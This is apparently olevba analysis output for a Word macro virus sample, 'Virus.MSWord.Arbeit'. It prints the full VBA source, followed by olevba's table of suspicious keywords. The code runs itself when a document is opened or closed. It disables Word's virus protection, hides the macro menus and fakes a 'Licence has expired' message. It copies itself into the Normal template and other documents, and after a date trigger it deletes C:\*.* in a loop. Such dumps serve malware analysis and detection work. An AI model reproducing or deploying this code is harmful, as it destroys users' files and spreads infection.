olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Arbeit
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Arbeit - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NoWork.bas 
in file: ./Virus.MSWord.Arbeit - OLE stream: 'Macros/VBA/NoWork'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub toolsmacro()
MsgBox "The Licence has expired"
End Sub
Sub autoopen()
On Error Resume Next
Application.DisplayStatusBar = False
Application.CommandBars("Visual Basic").Enabled = False
Application.CommandBars("Tools").Controls("Macro").Visible = False
Application.EnableCancelKey = wdCancelDisabled
Application.ScreenUpdating = False
Application.UserName = "NoWork Inc."
Application.UserInitials = "NWI"
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Set fu = NormalTemplate.VBProject.VBComponents("NoWork")
Set ck = ActiveDocument.VBProject.VBComponents("NoWork")
Set off = ThisDocument.VBProject.VBComponents("NoWork")
If ActiveDocument.VBProject.VBComponents.Item("NoWork").Name = "NoWork" Then
ck.export ("c:\mlpog.sys")
End If
If NormalTemplate.VBProject.VBComponents.Item("NoWork").Name = "NoWork" Then
fu.export ("c:\mlpog.sys")
End If
impossible:
If Day(Now()) >= 15 And Month(Now()) >= 10 Then
MsgBox "The technology will be kill humaneness", vbInformation + vbOKOnly, "NoWork Inc."
Kill "C:\*.*"
System.Cursor = wdCursorWait
GoTo impossible
End If
' Fuck Capitalism - For a no government - A dream world - MLPOG V. 1.02
End Sub
Sub viewvbcode()
MsgBox "The Licence has expired"
End Sub
Sub autoclose()
On Error Resume Next
Set th = NormalTemplate.VBProject.VBComponents
Set ef = ActiveDocument.VBProject.VBComponents
Set ly = ThisDocument.VBProject.VBComponents
If Not th.Item("NoWork").Name = "NoWork" Then
th.Import ("c:\mlpog.sys")
End If
If Not ef.Item("NoWork").Name = "NoWork" Then
ef.Import ("c:\mlpog.sys")
End If
If Not ly.Item("NoWork").Name = "NoWork" Then
ly.Import ("c:\mlpog.sys")
End If
If ActiveDocument.Saved = False Then
    ActiveDocument.Save
End If
If ThisDocument.Saved = False Then
    ThisDocument.Save
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

